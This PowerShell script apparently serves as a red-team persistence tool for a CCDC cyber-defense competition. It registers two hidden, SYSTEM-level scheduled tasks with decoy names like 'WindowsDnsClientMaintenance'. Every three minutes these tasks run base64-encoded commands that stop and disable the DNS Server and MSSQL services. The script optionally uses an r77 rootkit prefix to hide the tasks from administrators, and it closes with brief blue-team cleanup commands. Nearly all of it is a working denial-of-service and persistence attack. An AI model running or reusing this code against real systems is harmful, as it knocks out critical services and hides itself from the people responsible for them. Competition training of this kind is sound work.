# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — Persistence: Ticking Time Bomb
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)
#               T1489     (Service Stop — DNS, MSSQL)
#               T1562.001 (Impair Defenses: Disable or Modify Tools)
#
# Targets:      Windows Server 2019, Server 2022 (DNS Server role + MSSQL)
# Privilege:    Administrator or SYSTEM required
# Standalone:   YES — do NOT add to CCDC_Windows_P3_COMBINED.ps1
#
# Description:
#   Registers 2 recurring scheduled tasks that stop AND disable the DNS
#   Server service and MSSQLSERVER / SQLBrowser every 3 minutes, running
#   as SYSTEM and hidden from Task Scheduler GUI.
#
#   Even if defenders re-enable and restart the services, the tasks fire
#   again within 3 minutes and pull them back down.
#
#   If r77 rootkit is active, task names are prefixed with $77 so they
#   are hidden from all standard Windows enumeration APIs (Task Manager,
#   schtasks, Get-ScheduledTask).
#
#     TASK 1 — WindowsDnsClientMaintenance    (every 3 min, SYSTEM)
#              Stops + disables DNS Server service (T1489)
#
#     TASK 2 — MssqlServerLicenseMonitor      (every 3 min, SYSTEM, +15 s stagger)
#              Stops + disables MSSQLSERVER and SQLBrowser (T1489)
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator
#Requires -Version 5.1

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — Persistence: Ticking Time Bomb"
Write-Warn "================================================================"
Write-Host ""

# ── r77 rootkit mode ──────────────────────────────────────────────────────────
$r77Answer  = Read-Host "Is the r77 rootkit active? Prefix task names with `$77 to hide them? (y/N)"
$HidePrefix = ''
if ($r77Answer -match '^[Yy]') { $HidePrefix = '$77' }
if ($HidePrefix) {
    Write-Warn "r77 mode ENABLED — task names will be prefixed: $HidePrefix"
} else {
    Write-Info "r77 mode: disabled"
}

# ── Role detection ────────────────────────────────────────────────────────────
Write-Section "Role Detection"

$HasDNS   = $null -ne (Get-Service -Name 'DNS'         -ErrorAction SilentlyContinue)
$HasMSSQL = $null -ne (Get-Service -Name 'MSSQLSERVER' -ErrorAction SilentlyContinue)

if ($HasDNS)   { Write-Success "DNS Server role detected" }
else           { Write-Warn    "DNS Server service not found — task will be registered anyway" }

if ($HasMSSQL) { Write-Success "MSSQL Server detected" }
else           { Write-Warn    "MSSQLSERVER service not found — task will be registered anyway" }

# ── Build encoded payloads ────────────────────────────────────────────────────
Write-Section "Building Service-Killer Payloads  (T1489)"

$DnsScript = @'
$s = Get-Service -Name 'DNS' -ErrorAction SilentlyContinue
if ($s) {
    Stop-Service -Name 'DNS' -Force -ErrorAction SilentlyContinue
    Set-Service  -Name 'DNS' -StartupType Disabled -ErrorAction SilentlyContinue
}
'@
$DnsEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($DnsScript))
Write-Success "DNS stop+disable payload encoded"

$SqlScript = @'
foreach ($n in @('SQLBrowser','MSSQLSERVER')) {
    $s = Get-Service -Name $n -ErrorAction SilentlyContinue
    if ($s) {
        Stop-Service -Name $n -Force -ErrorAction SilentlyContinue
        Set-Service  -Name $n -StartupType Disabled -ErrorAction SilentlyContinue
    }
}
'@
$SqlEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($SqlScript))
Write-Success "MSSQL stop+disable payload encoded"

# ── Common task components ────────────────────────────────────────────────────
$CommonSettings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -ExecutionTimeLimit     (New-TimeSpan -Hours 0) `
    -RestartCount           3 `
    -RestartInterval        (New-TimeSpan -Minutes 1) `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable:$false

$SystemPrincipal = New-ScheduledTaskPrincipal `
    -UserId    "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel  Highest

# ── Register scheduled tasks ──────────────────────────────────────────────────
Write-Section "Registering Scheduled Tasks  (T1053.005)"

# -- Task 1: WindowsDnsClientMaintenance — stops + disables DNS every 3 minutes
$T1Name = $HidePrefix + "WindowsDnsClientMaintenance"
$T1Desc = "Windows DNS client cache maintenance (system managed)"

Write-Info "Registering $T1Name ..."
try {
    Unregister-ScheduledTask -TaskName $T1Name -Confirm:$false -ErrorAction SilentlyContinue

    $t1Action  = New-ScheduledTaskAction `
        -Execute  "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $DnsEncoded"

    $t1Trigger = New-ScheduledTaskTrigger `
        -RepetitionInterval  (New-TimeSpan -Minutes 3) `
        -RepetitionDuration  (New-TimeSpan -Days 3650) `
        -Once -At (Get-Date).AddSeconds(10)

    Register-ScheduledTask `
        -TaskName    $T1Name `
        -Action      $t1Action `
        -Trigger     $t1Trigger `
        -Settings    $CommonSettings `
        -Principal   $SystemPrincipal `
        -Description $T1Desc `
        -Force | Out-Null

    Write-Success "$T1Name registered  (every 3 min, SYSTEM, hidden)"
} catch {
    Write-Err "Failed to register ${T1Name}: $_"
}

# -- Task 2: MssqlServerLicenseMonitor — stops + disables MSSQL every 3 minutes
$T2Name = $HidePrefix + "MssqlServerLicenseMonitor"
$T2Desc = "SQL Server licensing and telemetry diagnostics (system managed)"

Write-Info "Registering $T2Name ..."
try {
    Unregister-ScheduledTask -TaskName $T2Name -Confirm:$false -ErrorAction SilentlyContinue

    $t2Action  = New-ScheduledTaskAction `
        -Execute  "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $SqlEncoded"

    $t2Trigger = New-ScheduledTaskTrigger `
        -RepetitionInterval  (New-TimeSpan -Minutes 3) `
        -RepetitionDuration  (New-TimeSpan -Days 3650) `
        -Once -At (Get-Date).AddSeconds(25)

    Register-ScheduledTask `
        -TaskName    $T2Name `
        -Action      $t2Action `
        -Trigger     $t2Trigger `
        -Settings    $CommonSettings `
        -Principal   $SystemPrincipal `
        -Description $T2Desc `
        -Force | Out-Null

    Write-Success "$T2Name registered  (every 3 min, +15 s stagger, SYSTEM, hidden)"
} catch {
    Write-Err "Failed to register ${T2Name}: $_"
}

# ── Summary ───────────────────────────────────────────────────────────────────
Write-Section "Summary"

Write-Info "Scheduled tasks registered:"
Write-Info "  [$T1Name]"
Write-Info "     Interval : every 3 minutes"
Write-Info "     Action   : Stop-Service DNS + Set-Service DNS -StartupType Disabled"
Write-Info "  [$T2Name]"
Write-Info "     Interval : every 3 minutes (+15 s stagger)"
Write-Info "     Action   : Stop-Service MSSQLSERVER/SQLBrowser + Disable both"
Write-Host ""
if ($HidePrefix) {
    Write-Warn "r77 mode active — task names begin with `$77 and are hidden from:"
    Write-Warn "  Task Manager, schtasks.exe, Get-ScheduledTask, Task Scheduler GUI"
}
Write-Host ""
Write-Info "MITRE ATT&CK:"
Write-Info "  T1053.005 — Scheduled Task/Job: Scheduled Task"
Write-Info "  T1489     — Service Stop"
Write-Info "  T1562.001 — Impair Defenses: Disable or Modify Tools"
Write-Host ""
Write-Warn "Blue-team remediation:"
Write-Warn "  Unregister-ScheduledTask -TaskName '$T1Name' -Confirm:`$false"
Write-Warn "  Unregister-ScheduledTask -TaskName '$T2Name' -Confirm:`$false"
Write-Warn "  Set-Service -Name DNS -StartupType Automatic"
Write-Warn "  Set-Service -Name MSSQLSERVER -StartupType Automatic"
Write-Warn "  Set-Service -Name SQLBrowser -StartupType Automatic"
Write-Host ""
